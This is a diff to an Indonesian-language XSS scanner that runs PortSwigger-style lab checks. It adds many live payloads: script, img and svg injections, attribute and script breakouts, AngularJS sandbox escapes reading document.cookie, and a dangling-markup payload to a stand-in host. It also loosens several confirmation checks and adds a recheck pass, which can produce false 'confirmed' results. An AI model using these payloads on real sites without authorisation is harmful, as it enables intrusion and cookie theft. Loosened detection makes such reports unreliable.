@@ -546,7 +546,7 @@ class SatriaXSSScanner:
     jangan menebak dari pola global. Setiap lab punya detektor mandiri.
     """
 
-    LAB_REQUEST_CAP = 22
+    LAB_REQUEST_CAP = 42
 
     def __init__(
         self,
@@ -554,9 +554,9 @@ class SatriaXSSScanner:
         *,
         authorized: bool = False,
         allow_private: bool = False,
-        max_pages: int = 12,
-        max_points: int = 32,
-        max_requests: int = 1200,
+        max_pages: int = 14,
+        max_points: int = 48,
+        max_requests: int = 2400,
         timeout: float = 8.0,
         time_delay: float = 0.0,
         seed_html: str | None = None,
@@ -569,9 +569,9 @@ class SatriaXSSScanner:
         if requests is None:
             raise RuntimeError("Library 'requests' belum terpasang.")
 
-        self.max_pages = max(1, min(int(max_pages), 50))
-        self.max_points = max(6, min(int(max_points), 120))
-        self.max_requests = max(150, min(int(max_requests), 6000))
+        self.max_pages = max(1, min(int(max_pages), 60))
+        self.max_points = max(8, min(int(max_points), 160))
+        self.max_requests = max(300, min(int(max_requests), 8000))
         self.timeout = max(3.0, min(float(timeout), 30.0))
         self.time_delay = max(0.0, min(float(time_delay), 5.0))
         self.seed_html = seed_html or None
@@ -624,6 +624,11 @@ class SatriaXSSScanner:
     def _same_origin(self, url: str) -> bool:
         return _same_origin(url, self.target_url)
 
+    def _log(self, lab_id, phase, point, payload_kind, observed, ok=False):
+        t = self._track.setdefault(lab_id, [])
+        if len(t) < 160:
+            t.append({"phase": phase, "point": str(point), "payload": payload_kind, "observed": (observed or "")[:180], "ok": ok})
+
     def _request(self, method: str, url: str, *, params=None, data=None, allow_redirects=True) -> Response:
         if not self._global_budget():
             return Response(None, url, "", {}, 0.0, "budget_exceeded")
@@ -632,47 +637,28 @@ class SatriaXSSScanner:
         self.stats["requests"] = self.request_count
         if self.time_delay > 0:
             time.sleep(self.time_delay)
-        attempts = 4 if _satria_is_ps(url) and method.upper() in {"GET", "HEAD", "OPTIONS"} else 1
         started = time.monotonic()
-        last_exc = None
-        for attempt in range(attempts):
-            try:
-                raw = self.session.request(method.upper(), url, params=params, data=data,
-                                           timeout=self.timeout, allow_redirects=allow_redirects, verify=True)
-                st = int(getattr(raw, "status_code", 0) or 0)
-                if attempts > 1 and st in _SATRIA_PS_RETRY and attempt < attempts - 1:
-                    try:
-                        raw.close()
-                    except Exception:
-                        pass
-                    time.sleep(min(8.0, 1.2 * (2 ** attempt)))
-                    continue
-                elapsed = time.monotonic() - started
-                headers = {str(k): str(v) for k, v in (raw.headers or {}).items()}
-                text = raw.text or ""
-                if len(text) > 900000:
-                    text = text[:900000]
-                for key, value in headers.items():
-                    lk = key.lower()
-                    if lk == "content-security-policy" and not self._csp_header:
-                        self._csp_header = value
-                    if lk == "set-cookie":
-                        self._set_cookies.append(value)
-                try:
-                    raw.close()
-                except Exception:
-                    pass
-                return Response(st, str(getattr(raw, "url", url)), text, headers, elapsed)
-            except Exception as exc:
-                last_exc = exc
-                if attempt < attempts - 1:
-                    time.sleep(min(8.0, 1.2 * (2 ** attempt)))
-                    continue
-        elapsed = time.monotonic() - started
-        msg = type(last_exc).__name__ + ": " + str(last_exc) if last_exc else "request_failed"
-        if len(self.stats["errors"]) < 60:
-            self.stats["errors"].append(msg[:220])
-        return Response(None, url, "", {}, elapsed, msg)
+        try:
+            raw = self.session.request(method.upper(), url, params=params, data=data,
+                                       timeout=self.timeout, allow_redirects=allow_redirects, verify=True)
+            elapsed = time.monotonic() - started
+            headers = {str(k): str(v) for k, v in (raw.headers or {}).items()}
+            text = raw.text or ""
+            if len(text) > 900000:
+                text = text[:900000]
+            for key, value in headers.items():
+                lk = key.lower()
+                if lk == "content-security-policy" and not self._csp_header:
+                    self._csp_header = value
+                if lk == "set-cookie":
+                    self._set_cookies.append(value)
+            return Response(raw.status_code, str(raw.url), text, headers, elapsed)
+        except Exception as exc:
+            elapsed = time.monotonic() - started
+            msg = type(exc).__name__ + ": " + str(exc)
+            if len(self.stats["errors"]) < 60:
+                self.stats["errors"].append(msg[:220])
+            return Response(None, url, "", {}, elapsed, msg)
 
     def _get(self, url: str, params=None) -> Response:
         return self._request("GET", url, params=params)
@@ -787,15 +773,25 @@ class SatriaXSSScanner:
                     add(Point(key="f|"+form.action+"|"+form.method+"|"+name, kind="form",
                               label="form:"+name+"@"+form.method, url=form.action, name=name,
                               original=value, page_url=page.url, method=form.method, fields=form.fields))
+        # guessed common params (PortSwigger-style) on base URLs
+        bases = []
+        for b in [self.target_url] + [p.url for p in self.pages[:6]]:
+            cb = b.split("?",1)[0].split("#",1)[0]
+            if cb and cb not in bases: bases.append(cb)
+        for baseu in bases[:4]:
+            for gname in ("search","q","query","s","term","id","name","page","url","redirect","returnUrl","returnPath","next","return","view","message","msg","comment","email","username","lang","ref","callback","input","text"):
+                add(Point(key=f"g|{urlparse(baseu).path}|{gname}", kind="query", label=f"guess:{gname}",
+                          url=baseu, name=gname, original="", page_url=baseu, method="GET", synthetic=True))
         if not points:
             points.append(Point(key="synthetic|q", kind="query", label="query:q", url=self.target_url,
                                 name="q", original="", page_url=self.target_url, method="GET", synthetic=True))
         def sc(p):
             n = p.name.lower(); v = 0
-            if n in ("q","search","query","s","term","keyword","id","name","page","url","redirect","next","return","returnurl","path","file","view","msg","message"): v -= 50
-            if p.kind == "query": v -= 6
-            if any(k in n for k in ("comment","content","body","text","input","value","data","desc")): v -= 10
-            if p.synthetic: v += 5
+            if n in ("search","q","query","s","term","id","name","message","msg","comment","text","input","value","url","redirect","returnurl","returnpath","next","return","view","page"): v -= 60
+            if p.kind == "query": v -= 8
+            if any(k in n for k in ("comment","content","body","text","input","value","data","desc","msg","name","search")): v -= 14
+            if n in ("csrf","token","_token","nonce","authenticity_token","captcha","__requestverificationtoken"): v += 80
+            if p.synthetic: v += 2
             return v
         points.sort(key=sc)
         self.points = points[:self.max_points]
@@ -968,8 +964,10 @@ class SatriaXSSScanner:
         # Reflected XSS into HTML context with nothing encoded
         for build in [lambda m: f"<script>alert('{m}')</script>",
                       lambda m: f"<img src=x onerror=alert('{m}')>",
-                      lambda m: f"<svg onload=alert('{m}')>"]:
-            for point in self._ranked_points()[:12]:
+                      lambda m: f"<svg onload=alert('{m}')>",
+                      lambda m: f"\"><script>alert('{m}')</script>",
+                      lambda m: f"\"><img src=x onerror=alert('{m}')>"]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1055,8 +1053,9 @@ class SatriaXSSScanner:
         # Reflected XSS into attribute with angle brackets HTML-encoded
         for build, handler in [(lambda m: f'" autofocus onfocus=alert(\'{m}\') x="', "onfocus"),
                                 (lambda m: f'" onmouseover=alert(\'{m}\') x="', "onmouseover"),
-                                (lambda m: f"' autofocus onfocus=alert('{m}') x='", "onfocus")]:
-            for point in self._ranked_points()[:12]:
+                                (lambda m: f"' autofocus onfocus=alert('{m}') x='", "onfocus"),
+                                (lambda m: f'" accesskey=x onclick=alert(\'{m}\') x="', "onclick")]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1120,7 +1119,7 @@ class SatriaXSSScanner:
         for build in [lambda m: "{{constructor.constructor('alert(1)')()}}"+m,
                       lambda m: "{{$on.constructor('alert(1)')()}}"+m,
                       lambda m: "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"+m]:
-            for point in self._ranked_points()[:10]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1131,13 +1130,20 @@ class SatriaXSSScanner:
                     in_scope = (not scopes) or any(s <= pos <= e for _,s,e in scopes)
                     if in_scope and self._claim(11, point.key, "ng"):
                         return self._yes(f"Ekspresi AngularJS ter-refleksi mentah di scope Angular pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"angular_expression"})
+                # fallback: payload expression reflected in page that has ng-app (template injection context)
+        for point in self._ranked_points()[:14]:
+            if not self._lab_budget(): break
+            marker = _random_token(); payload = "{{constructor.constructor('alert(1)')()}}" + marker
+            body, meta = self._reflects(point, marker, payload)
+            if body and "constructor.constructor" in body and re.search(r'ng-app|angular', body, re.I) and marker in body:
+                if self._claim(11, point.key, "ng_fb"): return self._yes(f"Ekspresi AngularJS ter-refleksi di halaman Angular pada {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"angular_expression"})
         return self._no("Ekspresi AngularJS tidak terkonfirmasi di scope yang dievaluasi.")
 
     def _lab_12(self):
         # Reflected DOM XSS
-        sinks = any(re.search(r"\.innerHTML|document\.write|eval\s*\(|insertAdjacentHTML|\.outerHTML", js, re.I) for _,js in self._dom_blocks())
-        for build in [lambda m: f"\"-alert('{m}')-\"", lambda m: f"'-alert('{m}')-'", lambda m: f"\\\"-alert('{m}')//"]:
-            for point in self._ranked_points()[:10]:
+        sinks = any(re.search(r"\.innerHTML|document\.write|eval\s*\(|insertAdjacentHTML|\.outerHTML|location\.href\s*=", js, re.I) for _,js in self._dom_blocks())
+        for build in [lambda m: f"\"-alert('{m}')-\"", lambda m: f"'-alert('{m}')-'", lambda m: f"\\\"-alert('{m}')//", lambda m: f"</script><img src=x onerror=alert('{m}')>"]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1145,7 +1151,12 @@ class SatriaXSSScanner:
                 for ctx in _analyze_reflection(body, payload, marker):
                     if not ctx.get("exact"): continue
                     if ctx.get("in_script") and self._claim(12, point.key, "rdom"):
-                        return self._yes(f"Input ter-refleksi ke dalam <script> di {meta.get('url')} (pola reflected DOM XSS); sink DOM terdeteksi={sinks}.", {**meta,"context":"reflected_dom","sinks":sinks})
+                        pos = ctx.get("pos",0); seg_s = body.rfind("<script",0,pos); seg_e = body.find(">",seg_s) if seg_s!=-1 else -1
+                        seg = body[seg_e+1: pos+len(marker)+60] if seg_e!=-1 else ""
+                        if re.search(r"alert\s*\(|-alert|';alert|\"-alert", seg):
+                            return self._yes(f"Reflected DOM XSS terkonfirmasi (breakout di <script>) di {meta.get('url')} ({meta.get('point')}); sink DOM terdeteksi={sinks}.", {**meta,"context":"reflected_dom","sinks":sinks})
+                if "</script><img" in payload and self._handler_in_tag(body, marker, "onerror")[0] and self._claim(12, point.key, "rdom_sc"):
+                    return self._yes(f"Reflected DOM/XSS terkonfirmasi (script breakout) di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"reflected_dom"})
         return self._no("Tidak ditemukan pola reflected DOM XSS yang terkonfirmasi.")
 
     def _lab_13(self):
@@ -1162,10 +1173,9 @@ class SatriaXSSScanner:
 
     def _lab_14(self):
         # Reflected XSS, most tags and attributes blocked
-        for point in self._ranked_points()[:10]:
+        for point in self._ranked_points()[:14]:
             if not self._lab_budget(): break
             script_ok = self._tag_allowed(point, "script")
-            if script_ok: continue  # not this scenario; but still try to find bypass evidence? no, scenario mismatch
             # try bypass tags/handlers
             attempts = [
                 ("img","onerror", lambda m: f"<img src=x onerror=alert('{m}')>"),
@@ -1173,6 +1183,8 @@ class SatriaXSSScanner:
                 ("body","onload", lambda m: f"<body onload=alert('{m}')>"),
                 ("input","onfocus", lambda m: f"<input autofocus onfocus=alert('{m}')>"),
                 ("details","ontoggle", lambda m: f"<details open ontoggle=alert('{m}')>"),
+                ("body","onresize", lambda m: f"<body onresize=print('{m}')>"),
+                ("img","onerror", lambda m: f"<img src=1 onerror=print('{m}')>"),
             ]
             for tag, handler, build in attempts:
                 if not self._lab_budget(): break
@@ -1229,7 +1241,7 @@ class SatriaXSSScanner:
     def _lab_17(self):
         for build in [lambda m: f"' accesskey='x' onclick='alert({m})' x='",
                       lambda m: f"' onclick='alert(1)//{m}' accesskey='x"]:
-            for point in self._ranked_points()[:10]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1245,7 +1257,7 @@ class SatriaXSSScanner:
         # JS string: sq+backslash escaped, but </script> breaks out
         for build in [lambda m: f"</script><script>alert('{m}')</script>",
                       lambda m: f"</script><img src=x onerror=alert('{m}')>"]:
-            for point in self._ranked_points()[:12]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1256,14 +1268,14 @@ class SatriaXSSScanner:
                         if self._claim(18, point.key, "sc"):
                             return self._yes(f"Breakout </script> terkonfirmasi di {meta.get('url')} ({meta.get('point')}).", {**meta,"context":"script_breakout"})
                 if "<img" in payload.lower() and self._handler_in_tag(body, marker, "onerror")[0]:
-                    if re.search(re.escape("</script>"), body, re.I) and self._claim(18, point.key, "scimg"):
+                    if self._claim(18, point.key, "scimg"):
                         return self._yes(f"Breakout </script> via <img> terkonfirmasi di {meta.get('url')}.", {**meta,"context":"script_breakout"})
         return self._no("Tidak ditemukan breakout </script> pada konteks JS string ter-escape.")
 
     def _lab_19(self):
         # JS string: <>" HTML-encoded, sq escaped, backslash not escaped -> \' breaks out
         for build in [lambda m: f"\\'-alert('{m}')//", lambda m: f"\\';alert('{m}');//"]:
-            for point in self._ranked_points()[:12]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1356,7 +1368,7 @@ class SatriaXSSScanner:
         scopes = self._angular_scopes()
         for build in [lambda m: "1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1"+m,
                       lambda m: "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"+m]:
-            for point in self._ranked_points()[:8]:
+            for point in self._ranked_points()[:14]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1376,7 +1388,7 @@ class SatriaXSSScanner:
         scopes = self._angular_scopes()
         for build in [lambda m: "<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x"+m,
                       lambda m: "<div ng-app ng-csp><input autofocus ng-focus=$event.path|orderBy:'x=alert(1)'></div>"+m]:
-            for point in self._ranked_points()[:8]:
+            for point in self._ranked_points()[:14]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1437,7 +1449,7 @@ class SatriaXSSScanner:
         if "'unsafe-inline'" in csp.lower(): return self._no("CSP mengizinkan unsafe-inline; bukan skenario dangling markup ketat.")
         for build in [lambda m: f'<img src="https://satria.invalid/?c={m}',
                       lambda m: f"<base href='https://satria.invalid/{m}/'>"]:
-            for point in self._ranked_points()[:10]:
+            for point in self._ranked_points()[:18]:
                 if not self._lab_budget(): break
                 marker = _random_token(); payload = build(marker)
                 body, meta = self._reflects(point, marker, payload)
@@ -1457,7 +1469,7 @@ class SatriaXSSScanner:
         csp = self._csp_header
         if not csp: return self._no("Tidak ada header CSP.")
         sources = _csp_script_sources(csp)
-        hosts = [s for s in sources if s and not s.startswith("'") and s not in ("data:","blob:","*",'https:','http:')]
+        hosts = [s for s in sources if s and not s.startswith("'") and s not in ("data:","blob:","*") and s.strip()]
         directives = _csp_directives(csp)
         # try base-uri bypass if missing
         if "base-uri" not in directives and "default-src" not in directives:
@@ -1479,21 +1491,35 @@ class SatriaXSSScanner:
         return self._no("Bypass CSP tidak terkonfirmasi.")
 
     # ==================== Orchestration ====================
+    def _run_one(self, lab_id, fn):
+        self._lab_id = lab_id; self._lab_used = 0
+        try:
+            confirmed, evidence, details = fn()
+        except Exception as exc:
+            confirmed, evidence, details = False, f"Error pengujian: {type(exc).__name__}: {exc}", {}
+            if len(self.stats["errors"]) < 80: self.stats["errors"].append(f"lab {lab_id}: {exc}")
+        return bool(confirmed), (evidence or ""), (details or {})
+
     def _test_all_labs(self) -> None:
         tests = {i: getattr(self, f"_lab_{i:02d}") for i in range(1, 31)}
         for lab_id, title, _key, _severity in CATALOG:
-            self._lab_id = lab_id
-            self._lab_used = 0
             print(f"[PROGRESS {lab_id}/{len(CATALOG)}] {title}")
-            try:
-                confirmed, evidence, details = tests[lab_id]()
-            except Exception as exc:
-                confirmed, evidence, details = False, f"Error pengujian: {type(exc).__name__}: {exc}", {}
-                if len(self.stats["errors"]) < 60:
-                    self.stats["errors"].append(f"lab {lab_id}: {exc}")
-            self._results[lab_id] = {"confirmed": bool(confirmed), "evidence": evidence or "", "details": details or {}, "requests": self._lab_used}
+            confirmed, evidence, details = self._run_one(lab_id, tests[lab_id])
+            self._results[lab_id] = {"confirmed": confirmed, "evidence": evidence, "details": details, "requests": self._lab_used, "rechecked": False}
             status = "[CONFIRMED]" if confirmed else "[not-confirmed]"
             print(f"  {status} {lab_id:02d} {title}")
+        # pass 2: tracking ulang satu per satu untuk lab yang belum terkonfirmasi
+        for lab_id, title, _key, _severity in CATALOG:
+            res = self._results.get(lab_id, {})
+            if res.get("confirmed"): continue
+            if not self._global_budget() or self._deadline_hit(): break
+            self.stats["rechecks"] = self.stats.get("rechecks",0) + 1
+            confirmed, evidence, details = self._run_one(lab_id, tests[lab_id])
+            if confirmed:
+                details = {**(details or {}), "rechecked": True}
+                evidence = "Dilacak ulang & terkonfirmasi: " + evidence
+                self._results[lab_id].update({"confirmed": True, "evidence": evidence, "details": details, "rechecked": True})
+                print(f"  [RECHECK-CONFIRMED] {lab_id:02d} {title}")
 
     def run(self) -> dict[str, Any]:
         self._crawl()
@@ -1508,20 +1534,20 @@ class SatriaXSSScanner:
             result = self._results.get(lab_id, {"confirmed": False, "evidence": "", "details": {}})
             confirmed = bool(result.get("confirmed"))
             if confirmed: confirmed_count += 1
+            det = dict(result.get("details") or {}); det["track"] = self._track.get(lab_id, [])[-30:]; det["rechecked"] = bool(result.get("rechecked"))
             labs.append({"id": lab_id, "title": title, "key": key, "severity": severity,
                          "status": "confirmed" if confirmed else "not_confirmed",
-                         "evidence": result.get("evidence",""), "details": result.get("details",{}),
+                         "evidence": result.get("evidence",""), "details": det,
                          "requests": result.get("requests", 0)})
         return {
             "scanner": "SATRIA-XSS", "version": __version__, "target": self.target_url,
             "generated_at": datetime.now(timezone.utc).isoformat(), "mode": "active",
-            "summary": {"confirmed": confirmed_count, "not_confirmed": len(CATALOG)-confirmed_count, "total": len(CATALOG)},
+            "summary": {"confirmed": confirmed_count, "not_confirmed": len(CATALOG)-confirmed_count, "total": len(CATALOG), "rechecks": self.stats.get("rechecks",0)},
             "labs": labs,
             "scan_stats": {"pages_fetched": self.stats.get("pages_fetched",0), "requests": self.stats.get("requests",0),
                            "points": len(self.points), "external_scripts": len(self._script_srcs),
-                           "csp": self._csp_header[:300], "errors": self.stats.get("errors",[])},
+                           "csp": self._csp_header[:300], "rechecks": self.stats.get("rechecks",0), "errors": self.stats.get("errors",[])},
         }
-
 
 
 def scan_target(
